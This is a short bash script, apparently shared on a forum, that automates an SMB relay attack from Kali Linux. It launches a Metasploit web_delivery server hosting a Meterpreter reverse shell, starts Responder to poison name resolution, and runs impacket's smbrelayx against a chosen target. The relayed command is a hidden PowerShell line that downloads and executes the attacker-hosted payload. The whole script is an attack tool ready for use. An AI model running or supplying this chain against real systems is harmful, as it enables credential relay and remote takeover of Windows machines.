#!/bin/bash

#Guys – I threw together a python script to make launching relay attacks easier. It should automatically find and use your Kali IP on eth0 and will prompt for the target IP. I believe smbrelay is limited to one target. It will set up the metasploit payload, start responder, and begin the relay attack against the target. Hitting CTRL C will close the responder and metasploit windows but it will stop the smbrelay so you can change it to another target. The only catch is to switch targets you have to run the command manually against a different IP.

# Note this script requires the disabling the HTTP and SMB protocols in Responder

# located in /usr/share/responder/Responder.conf


# Ask the user for the target IP address

hostip=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)

read -p 'Enter a target IP. ' targetip


# Set up the meterpreter payload server

gnome-terminal -- bash -c "msfconsole -x \"use exploit/multi/script/web_delivery; set target 2; set URIPATH /; set payload windows/meterpreter/reverse_tcp; set LHOST $hostip; set exitonsession false; exploit -j\" && bash"


# Start responder

gnome-terminal -- bash -c "responder -rvw -I eth0 && bash"


# Run smbrelayx against the host target

bash /usr/share/doc/python-impacket/examples/smbrelayx.py -h $targetip -c "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://$hostip:8080/')"
